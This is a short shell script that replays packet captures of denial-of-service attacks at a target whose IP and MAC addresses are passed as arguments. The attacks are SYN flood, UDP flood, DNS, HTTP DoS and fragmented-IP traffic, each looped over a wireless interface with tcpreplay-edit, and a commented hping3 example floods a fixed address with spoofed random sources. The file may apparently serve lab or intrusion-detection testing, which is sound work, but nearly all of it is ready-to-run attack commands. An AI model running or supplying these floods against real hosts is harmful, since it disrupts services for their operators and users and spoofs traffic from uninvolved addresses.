SRCIP="$1"
DSTIP="$2"
SMAC="$3"
DMAC="$4"

#Example of using Kali
#hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 172.24.1.215

#Example of using tcpreply
#DOS attack SYN:
tcpreplay-edit --srcipmap=10.0.0.2:$SRCIP --dstipmap=10.128.0.2:$DSTIP --enet-smac=$SMAC --enet-dmac=$DMAC  --loop=10 -i wlan0 SYN.pcap

#DOS attack UDP:
tcpreplay-edit --srcipmap=223.251.186.236:$SRCIP --dstipmap=235.127.67.235:$DSTIP --enet-smac=$SMAC --enet-dmac=$DMAC --loop=10 -i wlan0 udp_flood.pcap

#DOS attack DNS:
tcpreplay-edit --srcipmap=207.86.6.174:$SRCIP --dstipmap=205.94.14.222:$DSTIP --enet-smac=$SMAC --enet-dmac=$DMAC  --loop=10 -i wlan0 dns.pcap

#DOS attack HTTP:
tcpreplay-edit --srcipmap=192.168.2.183:$SRCIP --dstipmap=192.168.10.124:$DSTIP --enet-smac=$SMAC --enet-dmac=$DMAC  --loop=10 -i wlan0 HTTPDoS.pcapng

#DOS attack IP fragmented:
tcpreplay-edit --srcipmap=10.0.0.2:$SRCIP --dstipmap=10.128.0.2:$DSTIP --enet-smac=$SMAC --enet-dmac=$DMAC  --loop=10 -i wlan0 ip_fragmented.pcap
